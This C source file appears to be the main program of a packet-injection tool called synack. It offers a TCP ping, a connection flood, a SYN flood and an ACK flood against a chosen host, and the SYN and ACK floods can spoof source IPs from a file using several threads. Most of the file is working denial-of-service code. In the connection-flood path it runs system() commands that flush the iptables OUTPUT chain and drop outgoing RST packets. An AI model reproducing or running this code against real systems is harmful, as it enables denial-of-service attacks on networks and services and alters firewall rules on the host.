/* Created by edubart FOR EDUCATIONAL AND TESTING purposes only.
 * Project page https://github.com/edubart/synack
 */

#include "leef.h"

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/time.h>
#include <pthread.h>

#define CONN_FLOOD 1
#define SYN_FLOOD  2
#define ACK_FLOOD  3
#define TCP_PING   4

/* global variables */
int running = 1;
uint32_t interface_addr = 0;
const char *interface = NULL;
uint32_t dest_addr = 0;
uint16_t dest_port = 0;
uint32_t sleep_interval = 0;
uint16_t action_uuid = 0;
uint32_t run_time = 0;
int action = TCP_PING;
int num_threads = 1;
uint32_t *spoof_addresses = NULL;
uint32_t spoof_addresses_size = 0;
uint8_t *send_data = NULL;
int send_data_size = 0;


/* handle term signals */
void signal_handler(int sig) {
    running = 0;
}

/* spoofing utilities */
uint32_t get_src_ip()
{
    if(spoof_addresses_size > 0) {
        int id;
        if(spoof_addresses_size > 1)
            id = leef_random_range(0, spoof_addresses_size-1);
        else
            id = 0;
        return spoof_addresses[id];
    }
    return interface_addr;
}

/* Connection flood */
void *conn_flood_attack_thread(void *param)
{
    struct leef_handle leef;
    if(!leef_init(&leef, INJECTING))
        return NULL;

    uint16_t src_port = leef_random_range(1025,65535);
    uint16_t id;
    uint32_t seq;

    while(running && (run_time <= 0 || leef_get_ticks() < run_time)) {
        if(++src_port <= 1024)
            src_port = 1025;
        id = leef_random_byte() << 8 | leef_random_byte();
        seq = action_uuid << 16 | id;
        leef_send_tcp_syn(&leef, interface_addr, dest_addr, src_port, dest_port, id, seq);
        if(sleep_interval)
            usleep(sleep_interval);
    }

    leef_terminate(&leef);
    running = 0;
    return NULL;
}

void conn_flood_sniff_thread()
{
    struct leef_handle leef;
    if(!leef_init(&leef, SNIFFING_AND_INJECTING))
        return;
    leef_set_sniff_packet_size(&leef, 64);

    uint16_t src_port;
    uint16_t id;
    uint32_t seq;
    uint32_t ack_seq;
    uint32_t lastTicks;
    uint32_t ticksNow;
    int syn_sent = 0;
    int synack_received = 0;
    int rst_received = 0;
    int fin_received = 0;
    int alive_connections = 0;
    int new_connections = 0;
    struct leef_sniffed_packet packet;
    int conn_ports[65536];

    memset(conn_ports, 0, sizeof(conn_ports));

    lastTicks = leef_get_ticks();

    while(running) {
        ticksNow = leef_get_ticks();
        if(run_time > 0 && ticksNow >= run_time)
            break;

        /* outputs attack information */
        if(ticksNow - lastTicks >= 1000) {
            printf("SYN: %d/s, SYN+ACK: %d/s, RST: %d/s, FIN: %d/s, NEW CONNs: %d/sec, FAILED CONNs: %d/sec, ALIVE CONNs: %d\n",
                   syn_sent, synack_received, rst_received, fin_received, new_connections, syn_sent - new_connections, alive_connections);
            fflush(stdout);

            synack_received = 0;
            rst_received = 0;
            fin_received = 0;
            syn_sent = 0;
            new_connections = 0;
            lastTicks = ticksNow;
        }

        if(leef_sniff_next_packet(&leef, &packet)) {
            /* check if the packet is from the host */
            if(packet.ip->protocol == IPPROTO_TCP && packet.ip->saddr == dest_addr && packet.in_ip.tcp->source == dest_port) {
                /* check if the packet was from this running attack instance */
                if(packet.in_ip.tcp->ack == 1 && action_uuid != ((packet.in_ip.tcp->ack_seq & 0xffff0000) >> 16))
                    continue;
                src_port = packet.in_ip.tcp->dest;
                /* SYN+ACK */
                if(packet.in_ip.tcp->syn == 1 && packet.in_ip.tcp->ack == 1) {
                id = ((packet.in_ip.tcp->ack_seq - 1) & 0xffff) + 1;
                seq = packet.in_ip.tcp->ack_seq;
                ack_seq = packet.in_ip.tcp->seq + 1;

                if(send_data_size) {
                    leef_send_raw_tcp(&leef, interface_addr, dest_addr, src_port, dest_port, id, seq, ack_seq,
                        TCP_ACK | TCP_PUSH, 5840, 64, send_data_size, send_data);
                } else {
                    leef_send_tcp_ack(&leef, interface_addr, dest_addr, src_port, dest_port, id, seq, ack_seq);
                }

                synack_received++;
                if(conn_ports[src_port] == 0) {
                    conn_ports[src_port] = 1;
                    alive_connections++;
                    new_connections++;
                }
                /* RST */
                } else if(packet.in_ip.tcp->rst == 1) {
                    static int warned = 0;
                    if(!warned && rst_received >= 0) {
                        printf("host started rejecting connections\n");
                        fflush(stdout);
                        warned = 1;
                    }

                    rst_received++;

                    if(conn_ports[src_port] == 1) {
                        alive_connections--;
                        conn_ports[src_port] = 0;
                    }
                /* FIN */
                } else if(packet.in_ip.tcp->fin == 1) {
                    static int warned = 0;
                    if(!warned && fin_received == 0) {
                        printf("host started ending connections, guessed connection timeout: %d secs\n", leef_get_ticks() / 1000);
                        fflush(stdout);
                        warned = 1;
                    }

                    fin_received++;

                    if(conn_ports[src_port] == 1) {
                        alive_connections--;
                        conn_ports[src_port] = 0;
                    }
                }
            /* check if the packet is to the host */
            } else if(packet.ip->protocol == IPPROTO_TCP &&
                      packet.ip->saddr == interface_addr && packet.ip->daddr == dest_addr && packet.in_ip.tcp->dest == dest_port
                      && packet.in_ip.tcp->syn == 1 && packet.in_ip.tcp->ack == 0) {
                if(action_uuid != ((packet.in_ip.tcp->seq & 0xffff0000) >> 16))
                    continue;
                syn_sent++;
                if(conn_ports[packet.in_ip.tcp->source] == 1) {
                    conn_ports[packet.in_ip.tcp->source] = 0;
                    alive_connections--;
                }
            }
        }
    }

    /* TODO: statistics here */
    printf("\n");

    leef_terminate(&leef);
}

/* calculate interface TX */
void interface_tx_thread()
{
    uint32_t lastTicks = leef_get_ticks();
    uint32_t ticksNow;
    int64_t lastTxPackets = leef_if_tx_packets(interface);
    int64_t txPackets;
    int64_t lastTxBytes = leef_if_tx_bytes(interface);
    int64_t txBytes;
    int64_t initialTxPackets = lastTxPackets;
    int64_t initialTxBytes = lastTxBytes;

    while(running) {
        ticksNow = leef_get_ticks();
        if(run_time > 0 && ticksNow >= run_time)
            break;
        if(ticksNow - lastTicks >= 1000) {
            txPackets = leef_if_tx_packets(interface);
            txBytes = leef_if_tx_bytes(interface);
            printf("%s TX: %d pkt/s, %.02f Mbps\n",
                interface,
                (int)(txPackets - lastTxPackets),
                ((txBytes - lastTxBytes)*8)/1000000.0);
            fflush(stdout);
            lastTicks = ticksNow;
            lastTxPackets = txPackets;
            lastTxBytes = txBytes;
        }
    }

    printf("--- %s:%d flood statistics ---\n", leef_addr_to_string(dest_addr), dest_port);
    printf("%lld packets sent, %.04f GB sent\n",
        leef_if_tx_packets(interface) - initialTxPackets,
        (double)(leef_if_tx_bytes(interface) - initialTxBytes)/1000000.0);
}

/* SYN flood */
void *syn_flood_attack_thread(void *param)
{
    struct leef_handle leef;
    if(!leef_init(&leef, INJECTING))
        return NULL;

    uint32_t src_ip;
    uint16_t src_port;
    uint16_t id;
    uint32_t seq;

    while(running && (run_time == 0 || leef_get_ticks() < run_time)) {
        src_ip = get_src_ip();
        src_port = leef_random_range(1025,65535);
        id = leef_random_u16();
        seq = action_uuid << 16 | leef_random_u16();
        leef_send_tcp_syn(&leef, src_ip, dest_addr, src_port, dest_port == 0 ? leef_random_u16() : dest_port, id, seq);
        if(sleep_interval)
            usleep(sleep_interval);
    }

    leef_terminate(&leef);
    running = 0;
    return NULL;
}

/* ACK flood */
void *ack_flood_attack_thread(void *param)
{
    struct leef_handle leef;
    if(!leef_init(&leef, INJECTING))
        return NULL;

    uint32_t src_ip;
    uint16_t src_port;
    uint16_t id;
    uint32_t seq;
    uint32_t ack;

    while(running && (run_time == 0 || leef_get_ticks() < run_time)) {
        src_ip = get_src_ip();
        src_port = leef_random_range(1025,65535);
        id = leef_random_u16();
        seq = action_uuid << 16 | leef_random_u16();
        ack = leef_random_u32();
        leef_send_tcp_ack(&leef, src_ip, dest_addr, src_port, dest_port == 0 ? leef_random_u16() : dest_port, id, seq, ack);
        if(sleep_interval)
            usleep(sleep_interval);
    }

    leef_terminate(&leef);
    running = 0;
    return NULL;
}

/* TCP ping */
void tcp_ping_thread()
{
    struct leef_handle leef;
    if(!leef_init(&leef, SNIFFING_AND_INJECTING))
        return;
    leef_set_sniff_packet_size(&leef, 128);

    uint32_t lastTicks;
    struct leef_sniffed_packet packet;
    uint16_t src_port = leef_random_range(1025,65535);
    uint16_t id;
    uint32_t seq;
    uint32_t ping_ports[65536];
    uint32_t ticksNow;
    memset(ping_ports, 0, sizeof(ping_ports));
    int sent = 0;
    int received = 0;
    unsigned long rtt_sum = 0;
    int rtt;
    int min_rtt = 9999999;
    int max_rtt = -1;
    int stopping = 0;

    lastTicks = leef_get_ticks();

    while(1) {
        if(!running && !stopping) {
            stopping = 1;
            lastTicks = leef_get_ticks();
        }

        ticksNow = leef_get_ticks();
        if(run_time > 0 && ticksNow >= run_time)
            break;

        /* outputs attack information */
        if(!stopping && ticksNow - lastTicks >= 1000) {
            lastTicks = ticksNow;

            /* send a SYN ping */
            if(++src_port <= 1024)
                src_port = 1025;

            id = leef_random_u16();
            seq = action_uuid << 16 | leef_random_u16();
            leef_send_tcp_syn(&leef, interface_addr, dest_addr, src_port, dest_port, id, seq);
            sent++;
            ping_ports[src_port] = ticksNow;
        /* wait 1 sec before stopping */
        } else if(stopping && leef_get_ticks() - lastTicks >= 500)
            break;

        if(leef_sniff_next_packet(&leef, &packet)) {
            /* check if the packet is from the host */
            if(packet.ip->protocol == IPPROTO_TCP && packet.ip->saddr == dest_addr && packet.in_ip.tcp->source == dest_port && action_uuid == ((packet.in_ip.tcp->ack_seq & 0xffff0000) >> 16)) {
                /* got a ping reply */
                if(ping_ports[packet.in_ip.tcp->dest] != 0) {
                    rtt = (leef_get_ticks() - ping_ports[packet.in_ip.tcp->dest]);
                    printf("port=%d flags=%s rrt=%d ms\n", dest_port, leef_name_tcp_flags(&packet), rtt);
                    ping_ports[packet.in_ip.tcp->dest] = 0;
                    received++;
                    rtt_sum += rtt;
                    min_rtt = rtt < min_rtt? rtt : min_rtt;
                    max_rtt = rtt > max_rtt? rtt : max_rtt;
                }
            }
        }
    }
    running = 0;

    /* print stastistics */
    printf("--- %s:%d ping statistics ---\n", leef_addr_to_string(dest_addr), dest_port);
    printf("%d packets sent, %d packets received, %.02f%% packet loss\n", sent, received, sent > 0 ? (sent - received)/(float)sent : .0f);
    if(received > 0) {
        printf("rtt min/avr/max = %d/%d/%d ms\n", min_rtt, (int)(rtt_sum/received), max_rtt);
    }

    leef_terminate(&leef);
}

void print_help(char **argv)
{
    printf("Usage: %s -i <interface> -h <host> [action] [options]\n", argv[0]);
    printf("Actions:\n");
    printf("  -P                - TCP ping (default action)\n");
    printf("  -C                - Connection flood\n");
    printf("  -S                - SYN flood\n");
    printf("  -A                - ACK flood\n");
    printf("General options:\n");
    printf("  -i [interface]    - Which interface to do the action (required)\n");
    printf("  -h [host]         - Target host (required)\n");
    printf("  -p [port]         - Target port (default: random)\n");
    printf("  -t [time]         - Ru time in seconds (default: infinite)\n");
    printf("  -u [interval]     - Sleep interval in microseconds (default: 10000)\n");
    printf("  -s [ip]           - Use a custom source address\n");
    printf("  --help            - Print this help\n");
    printf("Connection flood options:\n");
    printf("  -d [binary file]  - Send binary file as data\n");
    printf("SYN/ACK flood options:\n");
    printf("  -m [threads]      - Number of send threads (default: 1)\n");
    printf("  -f [text file]    - Read a list of IPs from a text file for spoofing\n");
}

int main(int argc, char **argv)
{
    /* catch signals */
    signal(SIGTERM, &signal_handler);
    signal(SIGINT, &signal_handler);

    if(argc == 1) {
        print_help(argv);
        return 0;
    }

    /* generate attack uuid */
    static struct timeval tv;
    gettimeofday(&tv, 0);
    action_uuid = (((tv.tv_sec % 1000) * 1000) + (tv.tv_usec / 1000)) & 0xffff;

    /* handle options */
    int arg;
    const char *opt;
    for(arg=1;arg<argc;arg++) {
        opt = argv[arg];
        if(opt && opt[0] == '-' && strlen(opt) == 2) {
            switch(opt[1]) {
                case 'C':
                    action = CONN_FLOOD;
                    break;
                case 'S':
                    action = SYN_FLOOD;
                    break;
                case 'A':
                    action = ACK_FLOOD;
                    break;
                case 'P':
                    action = TCP_PING;
                    break;
                case 'i':
                    interface = argv[++arg];
                    interface_addr = leef_if_ipv4(interface);
                    if(interface_addr == 0) {
                        fprintf(stderr, "could not read interface ipv4 address\n");
                        return -1;
                    }
                    break;
                case 'h':
                    dest_addr = leef_resolve_hostname(argv[++arg]);
                    if(dest_addr == 0) {
                        fprintf(stderr, "could not resolve hostname address\n");
                        return -1;
                    }
                    break;
                case 'p':
                    dest_port = atoi(argv[++arg]);
                    break;
                case 'm':
                    num_threads = atoi(argv[++arg]);
                    if(num_threads == 0) {
                        fprintf(stderr, "use at least 1 thread\n");
                        return -1;
                    }
                    break;
                case 's':
                    interface_addr = leef_resolve_hostname(argv[++arg]);
                    if(interface_addr == 0) {
                        fprintf(stderr, "could not resolve source address\n");
                        return -1;
                    }
                    break;
                case 'u':
                    sleep_interval = atoi(argv[++arg]);
                    break;
                case 'f': {
                    FILE *fp = fopen(argv[++arg], "r");
                    if(fp) {
                        char ip[32];
                        int ch;

                        printf("reading spoofed ip addresses...\n");
                        fflush(stdout);

                        spoof_addresses_size = 0;

                        fseek(fp, 0, SEEK_SET);
                        while((ch = fgetc(fp)) != EOF)
                            if(ch == '\n')
                                spoof_addresses_size++;

                        spoof_addresses = (uint32_t *)malloc(spoof_addresses_size * 4);

                        fseek(fp, 0, SEEK_SET);

                        ch = 0;
                        while(!feof(fp)) {
                            fgets(ip, 32, fp);
                            char *c;
                            while((c = strchr(ip, '\n')) || (c = strchr(ip, '\r')) || (c = strchr(ip, ' ')))
                                c[0] = 0;
                            uint32_t addr = leef_string_to_addr(ip);
                            if(addr != 0)
                                spoof_addresses[ch++] = addr;
                        }
                        fclose(fp);

                        spoof_addresses_size = ch;

                        printf("done, read %d ips\n", spoof_addresses_size);
                    } else {
                        fprintf(stderr, "failed opening spoofing IPs text file!\n");
                        return -1;
                    }
                    break;
                }
                case 't':
                    run_time = (uint32_t)(atoi(argv[++arg]))*1000;
                    break;
                case 'd': {
                    FILE *fp = fopen(argv[++arg], "rb");
                    if(fp) {
                        fseek(fp, 0, SEEK_END);
                        send_data_size = ftell(fp);
                        fseek(fp, 0, SEEK_SET);
                        send_data = (uint8_t *) malloc(send_data_size);
                        fread(send_data, send_data_size, 1, fp);
                        fclose(fp);
                    } else {
                        fprintf(stderr, "could not find data binary file %s\n", argv[arg]);
                        return -1;
                    }
                    break;
                }
                default:
                    fprintf(stderr, "incorrect option %s, see --help\n", opt);
                    return -1;
            }
        } else if(strncmp(opt, "--help", 6) == 0) {
            print_help(argv);
            return 0;
        } else {
            fprintf(stderr, "incorrect option %s, see --help\n", opt);
            return -1;
        }
    }

    if(dest_addr == 0) {
        fprintf(stderr, "please specify a target host, see --help\n");
        return -1;
    }

    if(interface == NULL) {
        fprintf(stderr, "please specify which interface that this action runs on\n");
        return -1;
    }

    pthread_t *threads = (pthread_t *)malloc(sizeof(pthread_t) * num_threads);
    int i;

    /* force first tick */
    leef_get_ticks();

    /* run the action */
    switch(action) {
        case TCP_PING:
            if(dest_port == 0) {
                fprintf(stderr, "you must specify a target port for this action!\n");
                return -1;
            }
            printf("TCP PING %s:%d\n", leef_addr_to_string(dest_addr), dest_port);
            tcp_ping_thread();
            break;
        case CONN_FLOOD:
            if(dest_port == 0) {
                fprintf(stderr, "you must specify a target port for this action!\n");
                return -1;
            }
            /* fill some iptables rules so that the kernel doesn't mess with the attack */
            system("iptables -F OUTPUT");
            system("iptables -I OUTPUT -p tcp --tcp-flags ALL RST -j DROP");

            printf("CONNECTION FLOOD %s:%d\n", leef_addr_to_string(dest_addr), dest_port);
            for(i=0; i < num_threads; ++i)
                pthread_create(&threads[i], NULL, conn_flood_attack_thread, NULL);
            conn_flood_sniff_thread();
            break;
        case SYN_FLOOD:
            printf("SYN FLOOD %s:%d\n", leef_addr_to_string(dest_addr), dest_port);
            for(i=0; i < num_threads; ++i)
                pthread_create(&threads[i], NULL, syn_flood_attack_thread, NULL);
            interface_tx_thread();
            break;
        case ACK_FLOOD:
            printf("ACK FLOOD %s:%d\n", leef_addr_to_string(dest_addr), dest_port);
            for(i=0; i < num_threads; ++i)
                pthread_create(&threads[i], NULL, ack_flood_attack_thread, NULL);
            interface_tx_thread();
            break;
    }

    /* wait threads */
    for(i=0;i<num_threads;++i)
        pthread_join(threads[i], NULL);

    /* cleanup */
    if(spoof_addresses)
        free(spoof_addresses);

    return 0;
}

